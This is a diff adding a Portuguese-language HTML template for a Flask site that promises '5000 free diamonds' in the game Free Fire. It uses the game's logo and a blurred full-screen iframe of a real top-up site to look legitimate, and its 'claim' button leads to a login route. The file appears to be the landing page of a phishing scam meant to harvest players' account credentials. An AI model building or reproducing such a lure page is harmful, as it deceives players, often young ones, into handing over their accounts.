@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Ganhe Dimas Grátis no Free Fire!</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}" />
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden;
+      font-family: 'Trebuchet MS', sans-serif;
+      background-color: #1a1a1a;
+      color: #f0f0f0;
+    }
+    iframe {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 1;
+    }
+    #overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(26, 26, 26, 0.3);
+      backdrop-filter: blur(8px);
+      z-index: 2;
+      pointer-events: none;
+    }
+    header, main {
+      position: relative;
+      z-index: 3;
+      max-width: 900px;
+      margin: 20px auto;
+      text-align: center;
+      background: rgba(26, 26, 26, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      color: #f0f0f0;
+      text-shadow: 0 0 5px #000;
+    }
+    img {
+      max-width: 150px;
+      margin-bottom: 15px;
+    }
+    h2 {
+      color: #d91c1c;
+      margin-bottom: 15px;
+      text-shadow: 1px 1px 2px #000;
+    }
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    button {
+      background-color: #d91c1c;
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.1rem;
+      padding: 12px 25px;
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #a71414;
+    }
+  </style>
+</head>
+<body>
+  <iframe src="https://moztopup.com" allowfullscreen></iframe>
+  <div id="overlay"></div>
+
+  <header>
+    <img src="{{ url_for('static', filename='imagens/ffLogo.png') }}" alt="Logo Free Fire" />
+    <h2>GANHE 5000 DIAMANTES GRÁTIS NO FREE FIRE!</h2>
+  </header>
+
+  <main>
+    <p>Participe do nosso evento exclusivo e receba diamantes para turbinar suas skins e passes de elite!</p>
+    <button onclick="window.location.href='{{ url_for('login') }}'">Resgatar Diamantes Agora</button>
+  </main>
+</body>
+</html>
